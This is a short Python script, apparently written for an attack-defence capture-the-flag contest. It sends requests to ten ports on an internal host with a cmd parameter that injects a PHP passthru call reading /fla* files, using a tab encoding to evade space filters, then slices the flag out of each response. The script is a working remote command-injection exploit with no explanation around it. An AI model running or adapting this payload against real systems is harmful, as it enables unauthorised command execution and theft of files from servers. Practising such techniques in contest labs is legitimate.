#coding:utf-8
import requests
tmp_url = 'http://172.23.26.66:'
for port in xrange(12345,12355):
	url = tmp_url + str(port) + '/?cmd=passthru("head%09/fla*");'
	res = requests.get(url)
	text = res.text
	s = "flag"
	flag = text[-39:-1]#从页面中获取flag
	print("port:"+str(port)+",flag:"+flag)